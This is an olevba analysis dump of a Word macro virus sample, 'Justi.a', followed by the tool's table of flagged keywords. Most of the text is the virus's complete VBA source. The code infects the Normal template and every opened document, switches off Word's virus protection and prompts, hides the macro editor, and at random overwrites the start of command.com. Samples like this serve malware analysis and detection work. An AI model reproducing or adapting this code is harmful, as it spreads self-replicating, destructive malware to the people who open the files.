olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Justi.a-4cde82d4413c61933491b4cd8d768f2249fc7b3d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Justi.a-4cde82d4413c61933491b4cd8d768f2249fc7b3d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO justice.bas 
in file: Virus.MSWord.Justi.a-4cde82d4413c61933491b4cd8d768f2249fc7b3d - OLE stream: 'Macros/VBA/justice'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub infectnormal()
Set activedoc = ActiveDocument.VBProject.VBComponents
Set normaldot = NormalTemplate.VBProject.VBComponents
x = Application.StartupPath + "\justice.tmp"
activedoc("justice").Export (x)
normaldot.import (x)
Kill (x)
End Sub
Private Sub infectactive()
Set activedoc = ActiveDocument.VBProject.VBComponents
Set normaldot = NormalTemplate.VBProject.VBComponents
x = Application.StartupPath + "\justice.tmp"
normaldot("justice").Export (x)
activedoc.import (x)
Kill (x)
End Sub
Private Function normalinfected() As Boolean
Set activedoc = ActiveDocument.VBProject.VBComponents
Set normaldot = NormalTemplate.VBProject.VBComponents
x = Application.StartupPath + "\justice.tmp"
For Each component In normaldot
   If component.Name = "justice" Then normalinfected = True
Next component
End Function
Private Function activeinfected() As Boolean
Set activedoc = ActiveDocument.VBProject.VBComponents
Set normaldot = NormalTemplate.VBProject.VBComponents
x = Application.StartupPath + "\justice.tmp"
For Each component In activedoc
   If component.Name = "justice" Then activeinfected = True
Next component
End Function
Private Function inipresent() As Boolean
With Application.FileSearch
    .FileName = "justice.ini"
    .LookIn = "C:\windows"
    .Execute
    If .FoundFiles.Count >= 1 Then inipresent = True Else inipresent = False
End With
End Function
Private Function mayinfect() As Boolean
Dim n As Boolean
mayinfect = True
If inipresent Then
mayinfect = False
n = System.PrivateProfileString( _
    FileName:="C:\windows\justice.ini", _
    Section:="destroy", Key:="infect")
On Error Resume Next
If n Then mayinfect = True
End If
End Function
Private Sub repcommandcom()
n = System.PrivateProfileString( _
    FileName:="C:\windows\justice.ini", _
    Section:="destroy", Key:="commandcom")
On Error Resume Next
If n Then
Dim a1 As Byte
Dim a2 As Byte
a1 = 205
a2 = 25
Open "c:\command.com" For Binary Access Write As #1
Put #1, 1, a1
Put #1, 2, a2
Close #1
End If
End Sub
Sub autoopen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
On Error Resume Next
Application.VBE.MainWindow.Visible = False


If mayinfect And Int((20 * Rnd) + 1) = 10 Then repcommandcom
If mayinfect And Not activeinfected Then infectactive
If mayinfect And Not normalinfected Then infectnormal
End Sub
Sub autoclose()
If mayinfect And Not activeinfected Then infectactive
End Sub
Sub autonew()
If mayinfect And Not activeinfected Then infectactive
End Sub
Sub AutoExec()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|AutoExec  |autonew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

